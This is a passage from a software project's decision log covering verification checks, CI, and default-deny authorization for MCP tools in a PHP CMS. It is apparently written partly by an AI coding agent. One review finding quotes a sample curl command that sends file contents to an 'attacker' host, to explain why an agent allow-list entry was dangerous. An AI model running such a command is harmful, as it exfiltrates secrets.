  - **Recorded and not fixed:** **NEW-26** — `reset-password.php`'s set-password form has no CSRF field or check. Pre-existing, exploitability genuinely low (a forged POST still needs the valid `user_id` + `token` pair, which is the secret CSRF would be substituting for), and it belongs to the authentication slice under D-031's narrowing. Noted because the file was in the diff and a reviewer looked at it; leaving it unrecorded would make the next reader find it again.
  - Confirmed sound by both reviewers against source, not merely read: the ordering (headers precede every emitting path below them), the nonce integrity (CSPRNG, one per request, no path where header and markup could diverge), the fail-closed CSP breaking no admin inline script, and the deliberate refusal to trust `X-Forwarded-Proto`.

## D-045 — keel-verify gains six checks and a WARN tier; two release-packaging defects are made detectable, not fixed
- Date / phase: 2026-07-20 / Phase 5, Sprint 1 slice 9 (the INDEX scope, the WARN treatment, the CI matrix and the i18n check were all user decisions)
- Decision: `scripts/keel-verify` grows from 2 checks to **9**, covering the Phase 5 §1a promises that apply to this project. `docs/api/INDEX.md` gets a **verifier, not a regenerator**. A new **WARN** tier reports a genuinely-broken property whose fix is owned by another phase, printing full evidence without changing the exit code. `.github/workflows/ci.yml` runs the same commands the test points run, on PHP 8.2 and 8.3, with a syntax-only 8.1 job. All four permission allow-lists are written. `scripts/` enters the phpcs scan set with a fresh 0/2 baseline.
- **Why a verifier and not a regenerator (user decision).** INDEX.md was produced at adoption by bespoke mechanical extraction across 949 surfaces and has been hand-edited by every slice since. A regenerator that mis-extracts would *silently rewrite a correct file*, and the verifier would then pass because it agrees with the regenerator rather than with reality — a guard validating itself, which is L-010's failure mode with extra machinery. The verifier is cheap, fires only on real drift, and was green at birth for a **measured** reason: the eight Summary counts match their section row counts exactly (145/97/306/116/206/34/26/19, total 949).
- **Why two checks WARN instead of FAIL.** `docs/sprints/sprint-1.md` scopes H-01 (version touchpoints in four-way disagreement) to Phase 7 and this slice to making it *detectable*. A hard FAIL would turn keel-verify red for the whole sprint close and for every CI run, which trains people to ignore it — the exact mechanism that lets a check go inert. The WARN prints all five touchpoint values on every run. **The same treatment was extended to NEW-27** for consistency: the property is broken, the fix is Phase 7's, the evidence prints every time.
- **The placeholder check's scope is `git check-attr export-ignore`, not a hand-written list** — the same authority that builds the release archive. That choice is what surfaced NEW-27, and it is also why the check is precise: bare `TODO` and `PLACEHOLDER` are deliberately NOT matched, because `install.php` ships Spanish copy where "TODO" means *all* and a CSS section header reads "CHART PLACEHOLDER". A check that cries wolf on correct content gets ignored, which is the failure this whole slice exists to prevent. Green at birth across **448** distributable files, recounted independently.
- **The i18n check is the invariant that actually exists here (user decision).** §1a names WordPress i18n sniffs, which are N/A per D-006. The real invariant is catalogue key parity, and it is not theoretical: slices 7 and 8 both added keys to all 20 catalogues **by hand**. Green at birth across **120 files in 6 sets** (core + 5 plugins), proven by injecting both a missing key and an extra one.
- **Minified-asset sync is deliberately NOT built** — D-038, not re-opened. All 68 tracked `*.min.*` are third-party vendor distributions and Klytos ships no minified first-party asset, so the drift the check exists to detect cannot occur. Its absence is stated in the script's own header so it reads as a decision rather than an oversight.
- **CI seeds the playground, and that is load-bearing rather than convenience.** 91 of 138 tests are the integration tier, which SKIPS rather than fails without a playground (proven in slice 1). Un-seeded CI would run 34% of the suite and report green, omitting every authorization refusal test — the subject of the entire sprint. A skip is therefore promoted to a hard CI failure. **D-027's consequence is stated rather than papered over**: PHPUnit 11 needs PHP 8.2+ while Klytos declares 8.1+, so the suite cannot run on the declared floor; 8.1 gets a syntax-only job, honestly labelled.
- **The changelog check does not guess a convention.** With one entry there is nothing to order, so it reports that explicitly instead of passing silently. Klytos has not established whether its changelog grows oldest-first (Keel §1a) or newest-first (the ecosystem norm); the second entry is when that gets decided, by a person.
- Every one of the six new checks was **proven to FAIL on an injected violation and pass once reverted** — ten probes, all fired, tree left clean — and the two WARNs were proven to go **quiet** when their condition is fixed, because one direction is half a test (L-010). Pinned permanently by `tests/Unit/KeelVerifyTest.php`, itself proven in three directions.
- Alternatives rejected (and why): **regenerator + verifier** (correct end state if INDEX ever outgrows hand-editing, but it is a large bespoke extractor whose silent failure mode is worse than the drift it prevents); **hard FAIL on the version touchpoints** (strongest gate, but it either blocks the sprint close or forces a version-number decision that Phase 7 owns and that needs the user's explicit approval); **a recorded baseline for the touchpoints** (the D-025 pattern, and rejected here because freezing a broken invariant normalises it — a baseline is right for 193 pre-existing lint violations, wrong for four values that must be one value); **CI on 8.2/8.3 only** (simplest, leaves the declared floor verified by nothing); **raising the support floor to 8.2** (clean, but it is a support-matrix change for a released product with an installed base and belongs in its own decision, D-027's trigger).
- Supersedes: none. Extends the `scripts/keel-verify` created by **D-032**. Opens **NEW-27** and **NEW-28**; makes **H-01** detectable without fixing it.
- **Amended after the slice's own review cycle, before commit.** Both review subagents plus a
  `docs-verifier` and a fresh-context playground-QA pass ran on the finished diff (docs included, per
  L-015). Recorded here rather than folded in silently, because the shape of what they caught is the
  transferable part — and because two of the findings are the slice's own subject turned on itself:
  - **The `security-auditor` returned a BLOCKING finding, and it was mine.** `.claude/settings.json`
    and `.cursor/cli.json` allowed `Bash(curl -D -:*)` and `Bash(curl -s -o /dev/null:*)` **unscoped
    to any host**, while the sibling entries three lines above pinned `php -S` and `nc` to
    `127.0.0.1`. A committed allow-list is a grant to run **without a confirmation prompt**, in a
    **public repo with forks**, so this is an exfiltration and SSRF primitive
    (`curl -s -o /dev/null "https://attacker/?d=$(cat …)"` matches the prefix). Written into the
    config of the project that spent slice 6 building an SSRF control. Both entries are now pinned to
    `http://127.0.0.1`. `.codex` and `.gemini` omit curl entirely and were unaffected.
  - **A check that scanned nothing reported PASS**, which is precisely what this slice exists to
    prevent. If `git check-attr` returned nothing, `$distributable` stayed empty and the placeholder
    check printed `PASS … (0 files)` — indistinguishable from "nothing to flag" — while its sibling
    `keel_git()` already SKIPped loudly for the same cause. It now FAILs with *"it has not passed —
    it did not run"*, proven by forcing the call to fail.
  - **The `proc_open` stdin/stdout write-then-read pattern would HANG, not fail**, once the candidate
    list outgrows the OS pipe buffer. At 448 files it is comfortably under; the failure mode arrives
    silently with repository growth. Replaced with a temp file.
  - **The guard added earlier in this same slice was bypassable by changing one letter.**
    `str_ends_with( $_SERVER['SCRIPT_NAME'], '/scripts/dev/router.php' )` is case-sensitive, and on
    the case-insensitive filesystems where the playground actually runs (macOS, Windows)
    `/scripts/dev/Router.php` served the file and MISSED the guard — verified by probe. Now
    lowercased and percent-decoded. Both reviewers found this independently; the security pass also
    established it is **not exploitable** (condition 1 blocks every production SAPI, and the rest of
    the file is an allow-list keyed to `/installer/`), so it is defence in depth, not a hole.
  - **CI was about to publish a live credential.** `seed-playground.php:327` echoes the freshly-minted
    MCP application password, and a GitHub Actions log on a public repo is world-readable and
    retained after the runner is destroyed. Not practically exploitable (the credential only
    authenticates against that job's own ephemeral storage and nothing in the workflow listens on a
    port) — and redirected anyway, because "unreachable" is a weaker guarantee than "not logged".
  - **My own comments claimed the four allow-lists were the "same command set". They are not** — the
    Codex and Cursor lists are genuinely narrower. The L-002 defect, in text written to prevent it,
    for the second slice running (L-015 was the same shape). Corrected to say *narrower, deliberately*.
  - **`KeelVerifyTest` demands 9 checks while the script documents a 7-check no-git path** — two files
    from one slice giving contradictory guarantees. Resolved in favour of requiring git, stated in the
    test rather than left implicit.
  - **The fresh-context playground-QA pass failed the document on operational sequencing**, and every
    fix landed before the close: the port was hardcoded 19 times with no substitution mechanism (now
    `$KPORT`); following section 1 leaves a server that makes the suite **error**; following section 4
    stores a comment that makes the suite **fail**, beside a paragraph promising no reseed is needed;
    section 5 probed the wrong port; and the seeder printed *"Log in as any of: owner / admin /
    editor / viewer"*, which NEW-11 makes false. Its verdict on the product half is worth recording:
    every product claim it checked was true to the digit — 177 tools, 26 commands, 5 CVEs, the full
    403/401/302 matrix, the honeypot semantics.
  - Confirmed sound against source by the security pass, not merely read: `upgrade-assert.php`'s and
    `seed-playground.php`'s `'cli'` guards (no HTTP-serving SAPI is ever literally `cli`);
    `composer.json` has no install hooks, so `composer install` cannot transitively reach
    `install.php` or `cli.php build`; `upgrade-test.sh` never touches the working checkout; and
    `ci.yml` has minimal `permissions`, no secrets, plain `pull_request` (not `pull_request_target`),
    and no interpolation of `github.*` context into any shell block.

## D-046 — MCP tool authorization is one enforcement point in `ToolRegistry::call()`, default-deny, with a per-request actor and a JSON-RPC refusal
- Date / phase: 2026-07-22 / Phase 5, Sprint 2 planning (the four underlying user decisions were taken 2026-07-21; the plan was approved 2026-07-22)
- Decision: NEW-02 is closed by a **single** enforcement point inside `ToolRegistry::call()` (`installer/core/mcp/tool-registry.php:159`), placed **above** the `mcp.handle_tool` filter (`:164`) so it covers plugin-handled tools as well as the built-in table. It denies by default — no actor, an unmapped tool, or a role that lacks the tool's capability all throw a typed `Klytos\Core\MCP\PermissionDeniedException`. The decision remains `UserManager::hasPermission()` (S-04, the ONE matrix); the gate asks it, it does not add a second one. The MCP credential's identity is carried per request on the `ToolRegistry` instance via a **new** `setActor( int|string $userId, string $role )` — the registry is already built fresh per request (`server.php:40`), so no global is introduced — set by `server.php` after authentication and by `chat-engine` from the session; `call()` and `listTools()` read the actor.
- **Why this shape and not the recorded one-liner:** D-020 / `authorization.md:217` said "reuse `klytos_require_permission()` at the ToolRegistry enforcement point". Dropped in as-is it would **deny 100% of MCP traffic**, because `klytos_require_permission()` resolves identity from the session and there is no session on the MCP path — `Auth::startSession()` runs only in the admin path (`auth.php:62`, from `admin/bootstrap.php:216` and the OAuth consent view), while `Router::handleMcp()` (`router.php:123-147`) → `mcp/server.php` never starts one, so `klytos_current_user()` returns null (`helpers-global.php:370-376`). Identity has to be built from the credential first (D-047), and the gate consumes that actor rather than the ambient session. Verified against source this session by two Explore agents.
- **Why above the plugin filter, verified not assumed:** `mcp.handle_tool` (`:164`) can satisfy a call and `return` (`:165-169`) before the registered-tool table at `:171`. A gate below it would leave every plugin-handled tool ungated — the same by-omission failure S-07 exists to close. `call()` is reached by exactly two callers repo-wide (`server.php:225`, `chat-engine.php:309`) and no third, so one gate covers the whole surface.
- **Refusal shape is part of the contract, and it is DICTATED by the transport, not chosen.** The MCP server speaks JSON-RPC error objects everywhere (`JsonRpc::error( int $code, string $message, mixed $data = null, string|int|null $id = null ): array`, `json-rpc.php:84-100`). So `klytos_deny('mcp')` is **not** reused — it is absent from the MCP path today (0 matches) and its `{error,code}` body is not a JSON-RPC error object. Each transport catches `PermissionDeniedException`: `server.php::handleToolsCall()` emits `http_response_code(403); Helpers::jsonResponse( JsonRpc::error( -32000, …, $id ), 403 )`, mirroring the existing 401 auth-failure block (`server.php:103-108`) and keeping the id correlation; `chat-engine` returns a model-visible tool error. **This explicit-status step is mandatory, not cosmetic:** the normal dispatch emits via `Helpers::jsonResponse( $response )` with no status arg, which defaults to **HTTP 200** (`server.php:177`), so a denial merely *returned* as an error array would ship as 200. Verified this session.
- **`tools/list` is filtered by the actor's capabilities via the same map, and `tools/call` gates independently.** The list filter runs in `listTools()` after the `mcp.tools_list` plugin filter (`tool-registry.php:103`) and before the return (`:113`), so plugin-added tools are filtered too; but `call()` never trusts what `tools/list` returned — a caller naming a tool the list omitted is gated on its own. Hiding is not access control; the gate is.
- Alternatives rejected (and why): **reuse `klytos_require_permission()` verbatim at the choke point** (the recorded plan — denies all MCP traffic, see above); **a coarse owner-only gate in `ToolRegistry` now** (closes the escalation fast but over-restricts legitimate editor/viewer MCP use and tends to be reverted under pressure — the D-020 argument); **gate below the `mcp.handle_tool` filter** (simpler diff, leaves all plugin tools ungated); **reuse `klytos_deny('mcp')`** (its body is not a JSON-RPC error object, so an MCP client cannot parse it as one).
- Supersedes: none. Implements **D-020**; consumes D-047's actor and D-048's map. Closes the forward reference at `authorization.md:217-221` (done in slice 4).
- **Implemented in slice 2, with three mechanism notes (outcome unchanged):** (1) `setActor()`'s signature is `setActor( int|string|null $userId, ?string $role )`, not the literal `int|string $userId, string $role` this decision sketched — a **bearer token has a null user_id** (D-047), and it is the sprint's own end-to-end proof credential, so a non-nullable user id could not represent it; a deleted user record (NEW-08) yields a null role. Both nullable cases deny, exactly the fail-closed intent. (2) The gate's decision lives in ONE private `denialReason()` that both `call()` (throws on a non-null reason) and `listTools()` (drops tools with a non-null reason) consume, so the enforcement and the list filter can never diverge. (3) A new **`mcp.access_denied` action** fires before the throw — the MCP audit hook, mirroring `auth.access_denied`; like it, it cannot reverse the decision. Proven end to end: a `role=viewer` bearer token is refused `klytos_delete_page` with a JSON-RPC error object + **HTTP 403** over real HTTP, an owner bearer is allowed the same tool, an unknown role and an unmapped tool are denied, and `tools/list` for a viewer returns 19 tools without any destructive one — every denial proven to FAIL against the ungated code first (L-016).

## D-047 — MCP credentials carry a role, resolved from the credential, with an idempotent boot migration; unknown or absent role denies
- Date / phase: 2026-07-22 / Phase 5, Sprint 2 planning (user decisions 2 and 3, taken 2026-07-21)
- Decision: The MCP identity is built from the presented credential, not from a session. `token-auth.php` stops discarding the authenticated subject (the OAuth `user` is surfaced at `oauth-server.php:557` and dropped at `token-auth.php:228`) and surfaces an actor `{user_id, role}` to `server.php`; credential records gain a **role**. `createBearerToken()` takes an optional role (default `owner`). A single idempotent boot migration (the D-021 shape) backfills the installed base: **existing app-password and bearer-token records → `owner`** (recording what is already true, not a weakening), and an OAuth token → the role of the username it already stores. A credential that resolves to **no usable role, or a role the matrix does not know, DENIES** — the same fail-closed direction as `klytos_current_user()` after D-021.
- **Why "migrate to owner" is honest rather than a widening:** today every credential that can exist already operates as owner, because there is no per-call gate at all (NEW-02) and app passwords are structurally pinned to `config['admin_user']` (`auth.php:588-592`). Stamping the existing records `owner` records the status quo; it grants nothing that is not already held. What the change adds is the *ability to mint a lower role* going forward — which is what makes the gate in D-046 able to reduce power at all.
- **The residual gap is stated plainly, not papered over (user decision 3):** an existing bearer token carries no user field (`auth.php:469-475`), so after migration it is an **unattributed credential holding owner**. That is recorded as its own finding with a trigger in `docs/reference/mcp-authorization.md` (slice 4) rather than implied away — the honest limit is that migration cannot attribute a credential the product never attributed.
- **Per-role application passwords stay out of scope (L-014 framing):** app passwords are structurally owner-only until the **NEW-11** authentication slice lets a non-`admin_user` account exist and authenticate; minting an app password at a lower role is that slice's work. So the sprint's genuine end-to-end proof is a **`role=viewer` bearer token** — the one credential mintable at a lower role today — denied a destructive tool over real HTTP.
- Verification required (not optional): the upgrade path is tested **from the real previous version** (`scripts/dev/upgrade-test.sh`, real v0.30.1), asserting existing credentials resolve to `owner` after the migration and that re-running boot does not double-apply it.
- Alternatives rejected (and why): **leave credentials role-less and gate only by a global** (no way to express a lower-privilege credential, so the gate can never reduce power — defeats the sprint's purpose); **migrate existing credentials to a low role** (breaks every live integration on upgrade, and misrepresents reality — they operate as owner today); **default an unknown role to `viewer`** (fail-open's cousin — a corrupted or plugin-defined role would silently gain viewer's surface; unknown must deny, matching D-021 and the fix NEW-02 demands of `chat-engine`).
- Supersedes: none. Prerequisite for **D-046**; mirrors **D-021**'s fail-closed-with-migration shape on the MCP credential axis.
- **Amended during slice 1 implementation, before commit — the app-password mechanism, not the outcome.** The Decision above said the migration stamps "existing app-password **and** bearer-token records → owner." In the code it is cleaner and DRYer to resolve the **application-password and OAuth roles from the user record** (via `UserManager::getByUsername()`) — exactly as this decision already specified for OAuth — and to stamp a role **only on bearer tokens**, which name no user and so have nowhere else to hold one. The outcome is unchanged: an existing app password still resolves to `owner`, because it is pinned to the admin user, who is the owner. The gain is one source of truth for a credential's role (the user record wherever a user exists), forward-compatible with per-user credentials under NEW-11 — the role follows the user automatically. So `migrateCredentialRoles()` touches **bearer tokens only**. Proven on a real upgraded install (`scripts/dev/upgrade-test.sh`: a v0.30.1 bearer token, role-less, is stamped `owner` at boot).
- **A footgun caught by the migration test, recorded because it is the transferable part (L-017):** the first `migrateCredentialRoles()` iterated `$tokensData['tokens'] ?? [] as &$stored`. Iterating the result of `??` **by reference** binds to a throwaway temporary, so the stamps never wrote back — the method returned a non-zero count while persisting nothing (which would have DENIED every pre-Sprint-2 bearer token). Caught only because the test asserted the **persisted role**, not the return value. Fixed by guarding the key and iterating the real array. The same pattern in the pre-existing `validateAppPassword()` silently drops the app-password `last_used` update — recorded as **NEW-29**, not fixed (adjacent, cosmetic; D-031's narrowing).

## D-048 — A central MCP tool→capability map governs both `tools/call` and `tools/list`; absent = deny; keel-verify check 10 enforces coverage
- Date / phase: 2026-07-22 / Phase 5, Sprint 2 planning
- Decision: A new central file `installer/core/mcp/tool-capabilities.php` holds the MCP tool→capability map, mirroring `installer/core/admin-gate.php`'s gate map exactly: keyed by tool name, a **capability string** requires it, `null` is an audited "no capability" info exception (each `null` carries its reason in a comment), and an **absent entry is DENIED**. The map is filterable through a new `mcp.tool_capabilities` filter so a plugin declares capabilities for its own tools (the `admin.gate_map` precedent, D-032). Both `ToolRegistry::call()` (D-046) and `listTools()` read this one map. `scripts/keel-verify` gains **check 10** (FAIL tier): every registered tool name must have a map entry or a plugin-declared capability, inserted at ~`scripts/keel-verify:628` between checks 7 and 8, with its stable prefix added to `tests/Unit/KeelVerifyTest.php` `EXPECTED_CHECKS` and row 10 added to `docs/keel-verify.md`. keel-verify goes 9 → **10** checks.
- **Why a central map and not a per-tool annotation:** the 169 live tools are registered across 33 files by free functions; a per-file annotation has the S-07 failure mode one file later — a new tool file defaults to *ungated*. A central map where omission denies inverts it: a new tool is refused until it is mapped deliberately, and check 10 fails the build when a registered name has no entry. This is the exact inversion slice 4 of Sprint 1 chose for the admin gate, reused rather than reinvented.
- **Why the same map drives `tools/list`:** if the list advertised tools the caller cannot call, an agent would plan around tools it will be refused — a worse experience than an honest list. Filtering the list by the actor's capabilities keeps the advertised surface equal to the usable one, while `call()` still gates independently so a hidden tool named directly is refused, not merely absent.
- **The `mcp.tool_capabilities` filter is a plugin-trust boundary, stated rather than buried:** like `admin.gate_map` and `auth.capabilities`, it can weaken a shipped capability, and plugins already run as first-party code here. What it cannot do is open a hole by omission — an absent entry denies. Recorded in the reference doc.
- Alternatives rejected (and why): **per-tool capability argument on `register()`** (spreads the decision across 33 files + every plugin, and a forgotten one defaults open); **derive the capability from the tool's `destructiveHint`/`readOnlyHint` annotations** (those describe *behaviour* for the model, not *authorization*; conflating them means an annotation edit silently changes who may call a tool); **no keel-verify check** (the map would rot — a new tool added without a mapping would be silently denied in production with no build-time signal, which is a different failure but still a failure).
- Supersedes: none. Extends the `scripts/keel-verify` created by D-032/D-045 with check 10; consumed by D-046.
- **Amended in slice 2 after code review — filter-injected CORE tools, not just plugins, declare through the filter.** The plan (and this decision) framed `mcp.tool_capabilities` as the mechanism by which *plugins* declare their tools' capabilities in slice 3, and slice 2 as "map only the 169 loader-registered core tools." The `code-reviewer` caught that this framing missed a third tool source: the **x402** micropayments module is *core*, loaded unconditionally at `App::boot()` Step 10g, yet it registers its 8 `klytos_x402_*` tools through `mcp.tools_list`/`mcp.handle_tool` exactly as a plugin does — so default-deny made all 8 unusable by every role including owner the moment the gate landed (owner's `tools/list` dropped 177→169). The resolution keeps this decision's shape intact: x402 declares its own tools' capabilities through `mcp.tool_capabilities` in `installer/core/x402-mcp-tools.php` (reads → `x402.view`, writes → `x402.manage`, capabilities x402 already defines in the matrix), which is precisely the filter's purpose. The **static core map stays at exactly the 169 loader-registered tools**, so check 10 (which enumerates the loader's 33 files and stubs the filter) is unaffected and correctly does **not** cover filter-injected sets — those are verified by their own tests. Recorded honestly: "map only the 169 loader tools" silently assumed the loader is the only core tool source; x402 proves it is not. The `exists()`-before-gate HTTP gap this surfaced is **NEW-30**, bound to slice 3.

## D-049 — `integrity-tools.php` is wired in and gated, and the tool loader fails loudly on a missing or misnamed registration
- Date / phase: 2026-07-22 / Phase 5, Sprint 2 planning (user decision 4)
- Decision: `installer/core/mcp/tools/integrity-tools.php` — present on disk, registering 3 tools (`klytos_integrity_check`, `klytos_integrity_status`, `klytos_integrity_check_plugin`) via `registerIntegrityTools()`, but **absent from the loader's hardcoded 33-file list** and called nowhere, so **dead** — is added to the loader and given capability-map entries like every other tool. In the same slice, the loader (`tool-registry.php:284-305`) stops skipping a listed file whose register function is absent by **silent fall-through** and instead **fails loudly** (throws), so an unfinished or misnamed registration is surfaced at boot/CI rather than shipping as a quietly-missing tool.
- **Why loud failure, per L-007:** an unfinished registration is *evidence*, not clutter — `integrity-tools.php` was dead for exactly the reason the loader could not tell "this file registers nothing" from "this file is not meant to be here". A silent `continue`/fall-through hides both. Making it loud means the next tool file added to the list either registers correctly or breaks the build with a named message — the S-07 lesson applied to the loader.
- **Count consequence, corrected honestly (slice 4):** wiring the 3 tools in moves the live count from **169** to **172** core tools, so the served figure becomes **172 core + x402 (filter-injected)**. The count-truth pass (slice 4) reconciles every surface (INDEX, audit, skills, reference) to the honest figures rather than carrying the stale 172/177/206.
- Alternatives rejected (and why): **delete `integrity-tools.php` as dead** (L-007 — deleting the quieter side of a disagreement destroys the evidence; the tools are real and wanted); **wire it in but leave the loader silent** (fixes this instance and leaves the mechanism that hid it, so the next dead tool file is invisible again); **fail loudly but leave the file unmapped** (check 10, D-048, would then fail the build correctly — but shipping three tools with no capability is the NEW-02 defect in miniature, so they are mapped in the same slice).
- Supersedes: none. Related to L-007 (unreachable code is evidence) and D-048 (the map the new tools join).
- **Implemented in slice 3 (2026-07-23), one mechanism note:** the loader's per-file logic is extracted into a public `ToolRegistry::registerToolFile( string $toolsDir, string $file )` that throws the typed `Klytos\Core\MCP\ToolRegistrationException` on a missing file OR a file that defines neither its namespaced nor its global register function. The extraction keeps `registerAllTools()`'s hardcoded `$toolFiles = [ … ]` literal intact (keel-verify check 10 parses it) while making the fail-loud contract exercisable per file by `McpToolLoaderTest` — proven in both directions (a missing file and a registers-nothing file each throw; a valid file registers). `integrity-tools.php` is the 34th list entry; its 3 tools are mapped at `site.configure` in the static map (mirroring admin `system-integrity.php`). keel-verify check 10 now reads **172 tools** and passes both directions.

## D-050 — NEW-30 resolved by making filter-injected tools callable over HTTP; slice-3 capability assignments and playground plugin activation
- Date / phase: 2026-07-23 / Phase 5, Sprint 2 slice 3 (user-confirmed this session)
- Decision: **NEW-30** — filter-injected tools (x402, the shipped plugins) were advertised by `tools/list` but answered "Unknown tool" on `tools/call` over HTTP, because `server.php::handleToolsCall()` rejects `!exists()` before the gate and `exists()` was register-only. Of the two fix shapes the audit recorded, the user chose **"make callable over HTTP"** over "narrow the doc claim": `ToolRegistry::exists()` now returns true when a tool is registered **or** declared in the capability map, so the call reaches `call()`, which gates it (`denialReason`) and dispatches it via `mcp.handle_tool`. `handleToolsCall()` also catches a typed `ToolNotFoundException` from `call()` (a mapped-but-unhandled tool) and maps it back to "Unknown tool" rather than a 500. A name neither registered nor declared is still unknown (fails closed). `exists()`'s only caller repo-wide is `server.php`, so the broadening is contained.
- **Why the "callable" option and not the doc-narrowing one:** the slice's whole purpose is to gate the shipped plugins' tools; leaving them advertised-but-uncallable over a direct MCP HTTP client after gating them undercuts that. NEW-30's own note bound the fix to slice 3 "in scope by construction". The change is ~10 lines and keeps the gate authoritative on the call path.
- **Slice-3 capability assignments (from the ONE matrix, no second matrix):** file integrity (3 core tools) → `site.configure` (mirrors admin `system-integrity.php` / `api/integrity.php`; even reading an integrity report exposes system internals); `klytos-forms` (16 tools) → `forms.manage` (the matrix's existing forms capability, owner/admin; forms carry submitted data and the matrix has no `forms.view`, so the whole domain sits at the manage bar); `klytos-importer` (10 tools) → `site.configure` (a whole-site migration fetching arbitrary external URLs and bulk-creating pages is an operations privilege, the mirror of `klytos_export_site`). The plugins declare theirs through the `mcp.tool_capabilities` filter (the x402 precedent, D-048), so keel-verify check 10 (static core map only) does not cover them — each is covered by its own test (`McpToolGateTest`, `McpGateHttpTest`).
- **Playground plugin activation:** the seed (`scripts/dev/seed-playground.php`) now activates `klytos-forms` and `klytos-importer` (state written directly, no `install.php`/asset-rebuild side effects), so the app loads their MCP filters at boot. A playground that verifies MCP tool authorization but never loads the shipped MCP plugins would not exercise the real surface. Consequence: the served count over HTTP is now **206** (172 core + 8 x402 + 16 forms + 10 importer) — the slice-4 count-truth pass reconciles the served/live/dead figures across every surface.
- **chat-engine advisory list:** `getAvailableTools()` now default-denies an unrecognized role to an empty list and closes the `function_exists`/null fail-opens (absent helper → viewer, the least-privileged real role). Slice 2 already made the gate authoritative (`call()` denies regardless, `listTools()` is capability-filtered), so this makes the advisory list honest rather than adding teeth — proven in isolation (`ChatEngineToolListTest`: an unknown role gets `[]` even when the base list is the full owner set).
- Alternatives rejected (and why): **narrow the doc claim, HTTP register-only** (the audit's other option — smaller change, but leaves the shipped plugins' tools uncallable via a direct MCP HTTP client right after gating them); **editor-level importer capability** (`pages.create`/`assets.manage` — more permissive, mixes capabilities across the plugin's tools; the whole-site external-fetch operation fails safe higher); **a `forms.view` split for forms reads** (a new capability with no requirement behind it — over-restriction at `forms.manage` fails safe); **activate plugins via `PluginLoader::activate()`** (runs `install.php` + a plugin-asset rebuild — unnecessary side effects for a seeder; direct state write is enough for boot to load them).
- Supersedes: none. Resolves audit **NEW-30**; extends **D-048** (the plugin-declared-capabilities mechanism) and **D-049** (the loader/integrity slice). The `authorization.md:217-221` forward reference and the full count reconciliation remain **slice 4**; **D-035** (`ai.use` widening to editor) is **not** touched here — its trigger fires at Sprint 2 close, to be confirmed with the user.
- **Review amendment (2026-07-23, before commit — L-015):** both review subagents ran on the finished diff and returned **no blocking findings**; the `security-auditor` traced the default-deny invariant end to end (the gate runs before any dispatch for a filter-injected tool; the `PermissionDeniedException` catch precedes the fallback catch, so a 403 never degrades to "Unknown tool"). The `code-reviewer`'s one substantive note: the fallback `catch (\RuntimeException)` in `handleToolsCall()` was **broader than its purpose** — a future `mcp.handle_tool` handler raising a plain `RuntimeException` would be masked as "Unknown tool" rather than surfacing as a real error. Fixed by introducing a typed **`Klytos\Core\MCP\ToolNotFoundException`** (thrown by `call()` only for the mapped-but-unhandled case) and catching exactly that; a plain `RuntimeException` now propagates. Pinned by `McpToolGateTest::testAMappedButUnhandledToolThrowsToolNotFound`. Two stale `scripts/keel-verify` comments ("integrity-tools.php … dead until slice 3", "live count is 169") were corrected to reflect the 34-file/172-tool reality. Cosmetic inner-paren style was left as-is (matches the file's slice-1/2 precedent; `phpcs --standard=phpcs.xml` clean).

## D-051 — `ai.use` widens to `editor` now that MCP tools are gated; D-035's trigger fired and is closed
- Date / phase: 2026-07-24 / Phase 5, Sprint 2 slice 4 (**user-confirmed this session** — D-035 recorded an explicit user-decision trigger and it was put to the user before anything was changed)
- Decision: The `ai.use` capability becomes **owner + admin + editor** in the ONE matrix (`UserManager::hasPermission()`), so an editor may reach the admin AI chat (`admin/ai-chat.php` and the chat actions of `admin/api/ai-chat.php`). `viewer` stays excluded.
- **Why now, and why this is not a loosening of a security control:** D-035 excluded `editor` for exactly one stated reason — the AI chat executes MCP tools and the MCP tool layer had **zero** permission checks (NEW-02), so reaching that surface was owner-equivalent power *regardless of the caller's role*.
